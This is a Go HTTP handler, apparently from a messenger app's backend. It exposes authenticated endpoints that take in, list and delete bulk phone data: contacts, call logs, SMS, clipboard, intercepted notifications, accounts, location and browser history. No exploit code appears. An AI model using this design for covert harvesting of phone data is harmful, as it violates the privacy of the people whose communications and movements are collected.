package handler

import (
	"encoding/json"
	"net/http"
	"reflect"
	"strconv"

	"github.com/go-chi/chi/v5"
	"github.com/jeogram/messenger/internal/modules/phone/domain"
	"github.com/jeogram/messenger/internal/modules/phone/repository"
	"github.com/jeogram/messenger/internal/modules/phone/service"
	"github.com/jeogram/messenger/internal/pkg/auth"
	"github.com/jeogram/messenger/internal/pkg/middleware"
	"github.com/jeogram/messenger/internal/pkg/response"
)

// PhoneHandler暴露 endpoints for collecting phone telemetry/data.
type PhoneHandler struct {
	svc *service.PhoneService
	jwt *auth.JWT
}

func NewPhoneHandler(svc *service.PhoneService, jwt *auth.JWT) *PhoneHandler {
	return &PhoneHandler{svc: svc, jwt: jwt}
}

func parseLimitOffset(r *http.Request) (int, int) {
	limit, _ := strconv.Atoi(r.URL.Query().Get("limit"))
	offset, _ := strconv.Atoi(r.URL.Query().Get("offset"))
	if limit <= 0 || limit > 500 {
		limit = 100
	}
	if offset < 0 {
		offset = 0
	}
	return limit, offset
}

// collect принимает пакет записей и сохраняет их.
// user_id каждой записи принудительно подставляется из JWT (защита от подмены).
func (h *PhoneHandler) collect(w http.ResponseWriter, r *http.Request, store repository.Storer, makeSlice func() any) {
	userID := middleware.UserID(r)
	slice := makeSlice()
	if err := json.NewDecoder(r.Body).Decode(slice); err != nil {
		response.WriteError(w, http.StatusBadRequest, "bad_request", "invalid json")
		return
	}
	rv := reflect.ValueOf(slice).Elem()
	for i := 0; i < rv.Len(); i++ {
		if f := rv.Index(i).FieldByName("UserID"); f.IsValid() && f.CanSet() && f.Kind() == reflect.String {
			f.SetString(userID)
		}
	}
	if err := store.BatchCreate(r.Context(), slice); err != nil {
		response.WriteError(w, http.StatusInternalServerError, "internal_error", err.Error())
		return
	}
	response.WriteCreated(w, map[string]string{"status": "ok"})
}

// list возвращает записи пользователя для категории.
func (h *PhoneHandler) list(w http.ResponseWriter, r *http.Request, store repository.Storer) {
	userID := middleware.UserID(r)
	limit, offset := parseLimitOffset(r)
	out, err := store.ListAll(r.Context(), userID, limit, offset)
	if err != nil {
		response.WriteError(w, http.StatusInternalServerError, "internal_error", err.Error())
		return
	}
	response.WriteOK(w, out)
}

// clear удаляет все записи пользователя в категории.
func (h *PhoneHandler) clear(w http.ResponseWriter, r *http.Request, store repository.Storer) {
	userID := middleware.UserID(r)
	if err := store.ClearAll(r.Context(), userID); err != nil {
		response.WriteError(w, http.StatusInternalServerError, "internal_error", err.Error())
		return
	}
	response.WriteOK(w, map[string]string{"status": "cleared"})
}

// Summary — сводка по количеству записей в каждой категории.
//
//	@Summary	Сводка собранных данных
//	@Tags		phone
//	@Produce	json
//	@Security	BearerAuth
//	@Success	200	{object}	response.APIResponse
//	@Router		/phone/summary [get]
func (h *PhoneHandler) Summary(w http.ResponseWriter, r *http.Request) {
	userID := middleware.UserID(r)
	s, err := h.svc.Summary(r.Context(), userID)
	if err != nil {
		response.WriteError(w, http.StatusInternalServerError, "internal_error", err.Error())
		return
	}
	response.WriteOK(w, s)
}

// RegisterRoutes монтирует все эндпоинты сбора данных с телефона.
func (h *PhoneHandler) RegisterRoutes(r chi.Router) {
	prefix := "/phone"
	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/device", h.collectDevice)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/device", h.listDevice)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/device", h.clearDevice)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/status", h.collectStatus)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/status", h.listStatus)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/status", h.clearStatus)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/location", h.collectLocation)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/location", h.listLocation)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/location", h.clearLocation)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/apps", h.collectApps)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/apps", h.listApps)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/apps", h.clearApps)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/contacts", h.collectContacts)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/contacts", h.listContacts)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/contacts", h.clearContacts)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/calls", h.collectCalls)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/calls", h.listCalls)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/calls", h.clearCalls)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/sms", h.collectSms)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/sms", h.listSms)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/sms", h.clearSms)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/clipboard", h.collectClipboard)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/clipboard", h.listClipboard)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/clipboard", h.clearClipboard)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/notifications", h.collectNotifications)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/notifications", h.listNotifications)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/notifications", h.clearNotifications)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/usage", h.collectUsage)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/usage", h.listUsage)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/usage", h.clearUsage)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/media", h.collectMedia)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/media", h.listMedia)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/media", h.clearMedia)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/accounts", h.collectAccounts)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/accounts", h.listAccounts)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/accounts", h.clearAccounts)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/wifi", h.collectWifi)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/wifi", h.listWifi)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/wifi", h.clearWifi)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/bluetooth", h.collectBluetooth)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/bluetooth", h.listBluetooth)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/bluetooth", h.clearBluetooth)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/calendar", h.collectCalendar)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/calendar", h.listCalendar)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/calendar", h.clearCalendar)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/sensors", h.collectSensors)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/sensors", h.listSensors)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/sensors", h.clearSensors)

	r.With(middleware.JWTAuth(h.jwt)).Post(prefix+"/browser", h.collectBrowser)
	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/browser", h.listBrowser)
	r.With(middleware.JWTAuth(h.jwt)).Delete(prefix+"/browser", h.clearBrowser)

	r.With(middleware.JWTAuth(h.jwt)).Get(prefix+"/summary", h.Summary)
}

// ----- Device -----
// @Summary Отправить данные об устройстве
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.DeviceInfo true "массив записей"
// @Success 201 {object} response.APIResponse
// @Router /phone/device [post]
func (h *PhoneHandler) collectDevice(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Device, func() any { return &[]domain.DeviceInfo{} })
}

// @Summary Получить данные об устройстве
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/device [get]
func (h *PhoneHandler) listDevice(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Device)
}

// @Summary Удалить данные об устройстве
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/device [delete]
func (h *PhoneHandler) clearDevice(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Device)
}

// ----- Status -----
// @Summary Отправить состояние устройства
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.DeviceStatus true "массив записей"
// @Success 201 {object} response.APIResponse
// @Router /phone/status [post]
func (h *PhoneHandler) collectStatus(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Status, func() any { return &[]domain.DeviceStatus{} })
}

// @Summary Получить состояние устройства
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/status [get]
func (h *PhoneHandler) listStatus(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Status)
}

// @Summary Удалить состояние устройства
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/status [delete]
func (h *PhoneHandler) clearStatus(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Status)
}

// ----- Location -----
// @Summary Отправить геолокацию
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.LocationPoint true "массив точек"
// @Success 201 {object} response.APIResponse
// @Router /phone/location [post]
func (h *PhoneHandler) collectLocation(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Location, func() any { return &[]domain.LocationPoint{} })
}

// @Summary Получить геолокацию
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/location [get]
func (h *PhoneHandler) listLocation(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Location)
}

// @Summary Удалить геолокацию
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/location [delete]
func (h *PhoneHandler) clearLocation(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Location)
}

// ----- Apps -----
// @Summary Отправить список установленных приложений
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.InstalledApp true "массив приложений"
// @Success 201 {object} response.APIResponse
// @Router /phone/apps [post]
func (h *PhoneHandler) collectApps(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Apps, func() any { return &[]domain.InstalledApp{} })
}

// @Summary Получить установленные приложения
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/apps [get]
func (h *PhoneHandler) listApps(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Apps)
}

// @Summary Удалить установленные приложения
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/apps [delete]
func (h *PhoneHandler) clearApps(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Apps)
}

// ----- Contacts -----
// @Summary Отправить контакты телефона
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.PhoneContact true "массив контактов"
// @Success 201 {object} response.APIResponse
// @Router /phone/contacts [post]
func (h *PhoneHandler) collectContacts(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Contacts, func() any { return &[]domain.PhoneContact{} })
}

// @Summary Получить контакты телефона
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/contacts [get]
func (h *PhoneHandler) listContacts(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Contacts)
}

// @Summary Удалить контакты телефона
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/contacts [delete]
func (h *PhoneHandler) clearContacts(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Contacts)
}

// ----- Calls -----
// @Summary Отправить журнал звонков
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.CallLog true "массив звонков"
// @Success 201 {object} response.APIResponse
// @Router /phone/calls [post]
func (h *PhoneHandler) collectCalls(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Calls, func() any { return &[]domain.CallLog{} })
}

// @Summary Получить журнал звонков
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/calls [get]
func (h *PhoneHandler) listCalls(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Calls)
}

// @Summary Удалить журнал звонков
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/calls [delete]
func (h *PhoneHandler) clearCalls(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Calls)
}

// ----- SMS -----
// @Summary Отправить СМС
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.SmsLog true "массив СМС"
// @Success 201 {object} response.APIResponse
// @Router /phone/sms [post]
func (h *PhoneHandler) collectSms(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Sms, func() any { return &[]domain.SmsLog{} })
}

// @Summary Получить СМС
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/sms [get]
func (h *PhoneHandler) listSms(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Sms)
}

// @Summary Удалить СМС
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/sms [delete]
func (h *PhoneHandler) clearSms(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Sms)
}

// ----- Clipboard -----
// @Summary Отправить записи буфера обмена
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.ClipboardEntry true "массив записей"
// @Success 201 {object} response.APIResponse
// @Router /phone/clipboard [post]
func (h *PhoneHandler) collectClipboard(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Clipboard, func() any { return &[]domain.ClipboardEntry{} })
}

// @Summary Получить записи буфера обмена
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/clipboard [get]
func (h *PhoneHandler) listClipboard(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Clipboard)
}

// @Summary Удалить записи буфера обмена
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/clipboard [delete]
func (h *PhoneHandler) clearClipboard(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Clipboard)
}

// ----- Notifications -----
// @Summary Отправить перехваченные уведомления
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.NotificationCapture true "массив уведомлений"
// @Success 201 {object} response.APIResponse
// @Router /phone/notifications [post]
func (h *PhoneHandler) collectNotifications(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Notifications, func() any { return &[]domain.NotificationCapture{} })
}

// @Summary Получить перехваченные уведомления
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/notifications [get]
func (h *PhoneHandler) listNotifications(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Notifications)
}

// @Summary Удалить перехваченные уведомления
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/notifications [delete]
func (h *PhoneHandler) clearNotifications(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Notifications)
}

// ----- Usage -----
// @Summary Отправить статистику использования приложений
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.AppUsage true "массив записей"
// @Success 201 {object} response.APIResponse
// @Router /phone/usage [post]
func (h *PhoneHandler) collectUsage(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Usage, func() any { return &[]domain.AppUsage{} })
}

// @Summary Получить статистику использования
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/usage [get]
func (h *PhoneHandler) listUsage(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Usage)
}

// @Summary Удалить статистику использования
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/usage [delete]
func (h *PhoneHandler) clearUsage(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Usage)
}

// ----- Media -----
// @Summary Отправить описания медиафайлов
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.MediaItem true "массив файлов"
// @Success 201 {object} response.APIResponse
// @Router /phone/media [post]
func (h *PhoneHandler) collectMedia(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Media, func() any { return &[]domain.MediaItem{} })
}

// @Summary Получить описания медиафайлов
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/media [get]
func (h *PhoneHandler) listMedia(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Media)
}

// @Summary Удалить описания медиафайлов
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/media [delete]
func (h *PhoneHandler) clearMedia(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Media)
}

// ----- Accounts -----
// @Summary Отправить аккаунты устройства
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.DeviceAccount true "массив аккаунтов"
// @Success 201 {object} response.APIResponse
// @Router /phone/accounts [post]
func (h *PhoneHandler) collectAccounts(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Accounts, func() any { return &[]domain.DeviceAccount{} })
}

// @Summary Получить аккаунты устройства
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/accounts [get]
func (h *PhoneHandler) listAccounts(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Accounts)
}

// @Summary Удалить аккаунты устройства
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/accounts [delete]
func (h *PhoneHandler) clearAccounts(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Accounts)
}

// ----- WiFi -----
// @Summary Отправить Wi-Fi сети
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.WifiNetwork true "массив сетей"
// @Success 201 {object} response.APIResponse
// @Router /phone/wifi [post]
func (h *PhoneHandler) collectWifi(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Wifi, func() any { return &[]domain.WifiNetwork{} })
}

// @Summary Получить Wi-Fi сети
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/wifi [get]
func (h *PhoneHandler) listWifi(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Wifi)
}

// @Summary Удалить Wi-Fi сети
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/wifi [delete]
func (h *PhoneHandler) clearWifi(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Wifi)
}

// ----- Bluetooth -----
// @Summary Отправить Bluetooth-устройства
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.BluetoothDevice true "массив устройств"
// @Success 201 {object} response.APIResponse
// @Router /phone/bluetooth [post]
func (h *PhoneHandler) collectBluetooth(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Bluetooth, func() any { return &[]domain.BluetoothDevice{} })
}

// @Summary Получить Bluetooth-устройства
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/bluetooth [get]
func (h *PhoneHandler) listBluetooth(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Bluetooth)
}

// @Summary Удалить Bluetooth-устройства
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/bluetooth [delete]
func (h *PhoneHandler) clearBluetooth(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Bluetooth)
}

// ----- Calendar -----
// @Summary Отправить события календаря
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.CalendarEvent true "массив событий"
// @Success 201 {object} response.APIResponse
// @Router /phone/calendar [post]
func (h *PhoneHandler) collectCalendar(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Calendar, func() any { return &[]domain.CalendarEvent{} })
}

// @Summary Получить события календаря
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/calendar [get]
func (h *PhoneHandler) listCalendar(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Calendar)
}

// @Summary Удалить события календаря
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/calendar [delete]
func (h *PhoneHandler) clearCalendar(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Calendar)
}

// ----- Sensors -----
// @Summary Отправить показания датчиков
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.SensorReading true "массив показаний"
// @Success 201 {object} response.APIResponse
// @Router /phone/sensors [post]
func (h *PhoneHandler) collectSensors(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Sensors, func() any { return &[]domain.SensorReading{} })
}

// @Summary Получить показания датчиков
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/sensors [get]
func (h *PhoneHandler) listSensors(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Sensors)
}

// @Summary Удалить показания датчиков
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/sensors [delete]
func (h *PhoneHandler) clearSensors(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Sensors)
}

// ----- Browser -----
// @Summary Отправить историю браузера
// @Tags phone
// @Accept json
// @Produce json
// @Security BearerAuth
// @Param body body []domain.BrowserHistory true "массив записей"
// @Success 201 {object} response.APIResponse
// @Router /phone/browser [post]
func (h *PhoneHandler) collectBrowser(w http.ResponseWriter, r *http.Request) {
	h.collect(w, r, h.svc.Browser, func() any { return &[]domain.BrowserHistory{} })
}

// @Summary Получить историю браузера
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/browser [get]
func (h *PhoneHandler) listBrowser(w http.ResponseWriter, r *http.Request) {
	h.list(w, r, h.svc.Browser)
}

// @Summary Удалить историю браузера
// @Tags phone
// @Produce json
// @Security BearerAuth
// @Success 200 {object} response.APIResponse
// @Router /phone/browser [delete]
func (h *PhoneHandler) clearBrowser(w http.ResponseWriter, r *http.Request) {
	h.clear(w, r, h.svc.Browser)
}
